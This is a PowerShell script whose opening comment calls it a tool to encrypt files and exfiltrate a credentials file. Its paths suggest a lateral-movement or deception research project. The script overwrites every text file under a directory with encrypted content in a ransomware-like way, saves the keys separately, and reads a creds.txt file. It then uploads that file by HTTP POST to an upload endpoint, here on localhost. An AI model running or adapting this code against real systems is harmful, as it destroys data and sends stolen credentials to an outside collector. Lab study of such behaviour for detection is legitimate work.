# PowerShell Script to Encrypt Files and Exfiltrate a Credentials File
Start-Sleep -Seconds 3

# Load the necessary assembly for ProtectedData
Add-Type -AssemblyName System.Security

# Generate encryption key and IV
$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$aes.GenerateKey()
$aes.GenerateIV()

# Convert key and IV to Base64 strings to save them in text files
$key = [Convert]::ToBase64String($aes.Key)
$iv = [Convert]::ToBase64String($aes.IV)

# Save key and IV to files for the decryption script
$keyPath = "D:\drive\Research\projects\lateral_movement\ps-cmdlet-interceptor\key.txt"
$ivPath = "D:\drive\Research\projects\lateral_movement\ps-cmdlet-interceptor\iv.txt"
Set-Content -Path $keyPath -Value $key
Set-Content -Path $ivPath -Value $iv

# Directory where the text files are located
$directory = "decept"
$textFiles = Get-ChildItem -Path $directory -Filter "*.txt" -Recurse -File -ErrorAction SilentlyContinue

# Encrypting discovered text files
foreach ($file in $textFiles) {
    $content = Get-Content -Path $file.FullName -Raw
    $encryptedContent = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    if ($encryptedContent -ne $null) {
        [System.IO.File]::WriteAllBytes($file.FullName, $encryptedContent)
        Write-Host "Encrypted file: $($file.FullName)"
    } else {
        Write-Host "Failed to encrypt file: $($file.FullName)"
    }
}

# Save search results to a text file
$outputPath = Join-Path -Path (Get-Location) -ChildPath "found_pdfs.txt"
$textFiles | Select-Object FullName | Out-File $outputPath

# Credential file path and URI setup
$credsPath = Join-Path -Path (Get-Location) -ChildPath "creds\creds.txt"
$uri = "http://127.0.0.1:8000/upload"
$boundary = [guid]::NewGuid().ToString()

# Read the credentials file content as plain text
$credsFileContent = Get-Content $credsPath -Raw

# Build the multipart/form-data body
$bodyLines = @(
    "--$boundary",
    'Content-Disposition: form-data; name="file"; filename="creds.txt"',
    "Content-Type: text/plain", # Specify text/plain if sending as plain text
    "",
    $credsFileContent,
    "--$boundary--"
)

$body = $bodyLines -join "`r`n"

# Set headers for the request
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

# Send the POST request with the credentials file
$response = Invoke-WebRequest -Uri $uri -Method Post -Headers $headers -Body $body -ContentType "multipart/form-data; boundary=$boundary"
Write-Host "Response: $($response.Content)"
